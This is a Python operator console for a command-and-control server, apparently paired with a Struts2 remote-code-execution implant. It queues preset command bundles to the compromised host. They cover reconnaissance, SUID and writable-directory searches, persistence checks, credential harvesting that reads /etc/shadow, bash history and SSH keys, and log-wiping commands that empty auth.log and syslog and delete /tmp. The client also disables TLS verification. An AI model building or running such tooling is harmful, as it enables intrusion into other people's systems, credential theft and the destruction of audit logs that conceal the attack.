#!/usr/bin/env python3

import sys
import json
import argparse

import requests
from requests.exceptions import ConnectionError, Timeout, HTTPError

try:
    from rich.console import Console
    from rich.syntax import Syntax
    from rich.panel import Panel
    from rich.table import Table
    from rich import box
    _RICH = True
    console = Console()
except ImportError:
    _RICH = False

try:
    from prompt_toolkit import PromptSession
    from prompt_toolkit.history import InMemoryHistory
    from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
    from prompt_toolkit.completion import WordCompleter
    _PT = True
except ImportError:
    _PT = False


BUNDLES: dict[str, list[dict]] = {
    "recon": [
        {"title": "Who am I",          "task_type": "execute", "command": "whoami"},
        {"title": "Hostname",           "task_type": "execute", "command": "hostname"},
        {"title": "Network config",     "task_type": "execute", "command": "ip a"},
        {"title": "Running processes",  "task_type": "execute", "command": "ps aux"},
        {"title": "System info",        "task_type": "execute", "command": "uname -a"},
        {"title": "OS release",         "task_type": "execute", "command": "cat /etc/os-release"},
        {"title": "Local users",        "task_type": "execute", "command": "cat /etc/passwd"},
        {"title": "Logged in users",    "task_type": "execute", "command": "who"},
        {"title": "Active connections", "task_type": "execute", "command": "ss -tulnp"},
    ],
    "fs": [
        {"title": "List root",          "task_type": "execute", "command": "ls -la /"},
        {"title": "List home",          "task_type": "execute", "command": "ls -la ~"},
        {"title": "Find SUID binaries", "task_type": "execute", "command": "find / -perm -4000 -type f 2>/dev/null"},
        {"title": "Find writable dirs", "task_type": "execute", "command": "find / -writable -type d 2>/dev/null"},
        {"title": "Find txt files",     "task_type": "execute", "command": "find /home -name '*.txt' 2>/dev/null"},
    ],
    "persist": [
        {"title": "Crontabs",           "task_type": "execute", "command": "cat /etc/crontab"},
        {"title": "User crontab",       "task_type": "execute", "command": "crontab -l"},
        {"title": "Cron directories",   "task_type": "execute", "command": "ls -la /etc/cron*"},
        {"title": "Enabled services",   "task_type": "execute", "command": "systemctl list-units --type=service --state=running"},
        {"title": "RC local",           "task_type": "execute", "command": "cat /etc/rc.local"},
    ],
    "cred": [
        {"title": "Environment vars",   "task_type": "execute", "command": "env"},
        {"title": "Bash history",       "task_type": "execute", "command": "cat ~/.bash_history"},
        {"title": "SSH keys",           "task_type": "execute", "command": "ls -la ~/.ssh/"},
        {"title": "Sudo rights",        "task_type": "execute", "command": "sudo -l"},
        {"title": "Shadow file",        "task_type": "execute", "command": "cat /etc/shadow"},
    ],
    "net": [
        {"title": "ARP table",          "task_type": "execute", "command": "arp -a"},
        {"title": "Route table",        "task_type": "execute", "command": "ip route"},
        {"title": "DNS config",         "task_type": "execute", "command": "cat /etc/resolv.conf"},
        {"title": "Hosts file",         "task_type": "execute", "command": "cat /etc/hosts"},
        {"title": "Firewall rules",     "task_type": "execute", "command": "iptables -L -n -v"},
    ],
    "clean": [
        {"title": "Clear bash history", "task_type": "execute", "command": "cat /dev/null > ~/.bash_history"},
        {"title": "Clear auth log",     "task_type": "execute", "command": "cat /dev/null > /var/log/auth.log"},
        {"title": "Clear syslog",       "task_type": "execute", "command": "cat /dev/null > /var/log/syslog"},
        {"title": "Clear tmp",          "task_type": "execute", "command": "rm -rf /tmp/*"},
    ],
    "ping": [
        {"title": "Ping implant", "task_type": "ping"},
    ],
}


def ok(msg):
    if _RICH: console.print(f"[bold green][+][/bold green] {msg}")
    else: print(f"[+] {msg}")

def info(msg):
    if _RICH: console.print(f"[bold cyan][*][/bold cyan] {msg}")
    else: print(f"[*] {msg}")

def warn(msg):
    if _RICH: console.print(f"[bold yellow][!][/bold yellow] {msg}")
    else: print(f"[!] {msg}")

def err(msg):
    if _RICH: console.print(f"[bold red][-][/bold red] {msg}", highlight=False)
    else: print(f"[-] {msg}", file=sys.stderr)

def pretty(data, title=""):
    text = json.dumps(data, indent=2)
    if _RICH:
        console.print(Panel(
            Syntax(text, "json", theme="monokai", word_wrap=True),
            title=f"[bold]{title}[/bold]" if title else "",
            border_style="cyan",
        ))
    else:
        if title: print(f"\n── {title} ──")
        print(text)

def print_bundles():
    if _RICH:
        t = Table(title="Available Task Bundles", box=box.ROUNDED,
                  border_style="cyan", header_style="bold magenta")
        t.add_column("Bundle", style="bold yellow", no_wrap=True)
        t.add_column("Tasks", justify="right", style="cyan")
        t.add_column("Task titles", style="white")
        for name, tasks in BUNDLES.items():
            titles = ", ".join(t_["title"] for t_ in tasks)
            t.add_row(name, str(len(tasks)), titles)
        console.print(t)
    else:
        print("\nAvailable bundles:")
        for name, tasks in BUNDLES.items():
            print(f"  {name}  ({len(tasks)} tasks)")
            for task in tasks:
                print(f"    · {task['title']}  [{task['task_type']}]")
        print()


BANNER = r"""
  ██████╗██████╗      ██████╗██╗     ██╗
 ██╔════╝╚════██╗    ██╔════╝██║     ██║
 ██║      █████╔╝    ██║     ██║     ██║
 ██║     ██╔═══╝     ██║     ██║     ██║
 ╚██████╗███████╗    ╚██████╗███████╗██║
  ╚═════╝╚══════╝     ╚═════╝╚══════╝╚═╝
   Operator CLI  ·  struts2-rce
"""

HELP_TEXT = f"""
  list-tasks              List all tasks in the database
  list-results            List all results returned by the implant
  list-history            List the full task + result history
  addtask <bundle>        Queue every task in a bundle
  bundles                 Show all available bundles
  help                    Show this message
  exit / quit             Exit the CLI

Available bundles: {", ".join(BUNDLES.keys())}
"""


class LPClient:
    def __init__(self, host: str, port: int, timeout: int = 10):
        if host.startswith("http://") or host.startswith("https://"):
            self.base_url = f"{host.rstrip('/')}:{port}"
        else:
            self.base_url = f"https://{host}:{port}"
        self.timeout = timeout
        self._s = requests.Session()
        self._s.headers.update({"Content-Type": "application/json"})
        self._s.verify = False
        requests.packages.urllib3.disable_warnings()

    def _get(self, endpoint: str):
        r = self._s.get(f"{self.base_url}{endpoint}", timeout=self.timeout)
        r.raise_for_status()
        return r.json()

    def _post(self, endpoint: str, payload):
        r = self._s.post(f"{self.base_url}{endpoint}", json=payload, timeout=self.timeout)
        r.raise_for_status()
        return r.json()

    def list_tasks(self):   return self._get("/tasks")
    def list_results(self): return self._get("/results")
    def list_history(self): return self._get("/history")

    def submit_bundle(self, bundle_name: str) -> list:
        tasks = BUNDLES[bundle_name]
        responses = []
        for task in tasks:
            resp = self._post("/tasks", task)
            responses.append((task, resp))
        return responses


REPL_COMMANDS = ["list-tasks", "list-results", "list-history",
                 "addtask", "bundles", "help", "exit", "quit",
                 *BUNDLES.keys()]

def run_repl(client: LPClient):
    if _RICH: console.print(BANNER, style="bold cyan")
    else: print(BANNER)

    info(f"Listening post → {client.base_url}")
    info("Type 'help' for commands, 'bundles' to see available task bundles\n")

    if _PT:
        session = PromptSession(
            history=InMemoryHistory(),
            auto_suggest=AutoSuggestFromHistory(),
            completer=WordCompleter(REPL_COMMANDS, ignore_case=True),
        )
        _input = lambda: session.prompt("operator> ")
    else:
        _input = lambda: input("operator> ")

    while True:
        try:
            line = _input().strip()
        except (KeyboardInterrupt, EOFError):
            print(); break

        if not line:
            continue

        parts = line.split()
        cmd   = parts[0].lower()
        args  = parts[1:]

        try:
            if cmd in ("exit", "quit"):
                break

            elif cmd == "help":
                print(HELP_TEXT)

            elif cmd == "bundles":
                print_bundles()

            elif cmd == "list-tasks":
                data = client.list_tasks()
                if not data: warn("No tasks found.")
                else:
                    ok(f"{len(data)} task(s)")
                    pretty(data, "Tasks")

            elif cmd == "list-results":
                data = client.list_results()
                if not data: warn("No results yet.")
                else:
                    ok(f"{len(data)} result(s)")
                    pretty(data, "Results")

            elif cmd == "list-history":
                data = client.list_history()
                if not data: warn("History is empty.")
                else:
                    ok(f"{len(data)} record(s)")
                    pretty(data, "History")

            elif cmd == "addtask":
                if not args:
                    err("Usage: addtask <bundle>")
                    info(f"Available bundles: {', '.join(BUNDLES.keys())}")
                    continue

                bundle_name = args[0].lower()
                if bundle_name not in BUNDLES:
                    err(f"Unknown bundle '{bundle_name}'")
                    info(f"Available: {', '.join(BUNDLES.keys())}")
                    continue

                bundle_tasks = BUNDLES[bundle_name]
                info(f"Queuing {len(bundle_tasks)} task(s) from {bundle_name} ...")

                results = client.submit_bundle(bundle_name)
                for task, resp in results:
                    ok(f"  ✓ {task['title']}")

                ok(f"Bundle '{bundle_name}' queued — {len(results)} task(s) submitted.")

            ##add configure case, the task_type is "configure"
            ##So the JSON payload should look like this for example:
                    #json[
                        #{
                            #"task_type": "configure",
                            #"task_id": xxxx,
                            #"dwell": 30.0, (means post on average every 30 seconds)
                            #"running": true
                        #}
                    #]
            
            
            else:
                err(f"Unknown command '{cmd}'. Type 'help'.")

        except (ConnectionError, Timeout):
            err(f"Lost connection to {client.base_url}")
        except HTTPError as exc:
            err(f"HTTP {exc.response.status_code}: {exc.response.text}")
        except Exception as exc:
            err(f"Unexpected error: {exc}")

    info("Goodbye.")


def main():
    p = argparse.ArgumentParser(description="Operator CLI")
    p.add_argument("host")
    p.add_argument("port", nargs="?", type=int, default=5000)
    p.add_argument("--timeout", type=int, default=10)
    a = p.parse_args()

    client = LPClient(a.host, a.port, timeout=a.timeout)

    info(f"Connecting to {client.base_url} ...")
    try:
        client.list_tasks()
    except (ConnectionError, Timeout):
        err(f"Cannot reach {client.base_url} — is the listening post running?")
        sys.exit(1)
    except HTTPError as exc:
        err(f"HTTP {exc.response.status_code} from {client.base_url}")
        sys.exit(1)

    run_repl(client)


if __name__ == "__main__":
    main()
